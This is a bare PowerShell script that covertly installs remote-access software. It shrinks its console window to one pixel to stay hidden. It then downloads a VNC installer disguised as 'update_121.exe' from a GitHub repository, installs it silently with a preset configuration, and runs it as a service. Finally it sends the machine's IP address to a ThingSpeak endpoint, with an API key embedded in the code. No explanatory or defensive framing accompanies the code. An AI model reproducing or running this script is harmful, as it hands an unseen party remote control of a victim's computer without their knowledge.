Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")] 
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int W, int H); '

$consoleHWND = [Console.Window]::GetConsoleWindow();
$consoleHWND
[Console.Window]::MoveWindow($consoleHWND,0,0,1,1);
cd $Env:USERPROFILE -ErrorAction Stop
#Start-Sleep -Seconds 1 -ErrorAction Stop
$client = new-object System.Net.WebClient -ErrorAction Stop
#Start-Sleep -Seconds 1 -ErrorAction Stop
$client.DownloadFile("https://raw.githubusercontent.com/srbhptl39/automation/master/update_121.exe","$Env:USERPROFILE\update_121.exe") ;
$client.DownloadFile("https://raw.githubusercontent.com/srbhptl39/automation/master/ultravnc.ini","$Env:USERPROFILE\update_121.ini");
& $Env:USERPROFILE\update_121.exe /SP- /VERYSILENT /NORESTART -ErrorAction Stop
Copy-Item -Path $Env:USERPROFILE\update_121.ini -Destination 'C:\Program Files\uvnc bvba\UltraVNC\ultravnc.in' -ErrorAction Stop
#Start-Sleep -Seconds 1 -ErrorAction Stop
& 'C:\Program Files\uvnc bvba\UltraVNC\winvnc.exe' -install;
#Start-Sleep -Seconds 1 -ErrorAction Stop
& 'C:\Program Files\uvnc bvba\UltraVNC\winvnc.exe' -run;
$ipa=(Test-Connection -ComputerName $env:computername -count 1).IPV4Address.
$url = "https://api.thingspeak.com/update?api_key=F15031FIFGY353KO&field1=$ipa"
Invoke-WebRequest $url -Method Get
exit
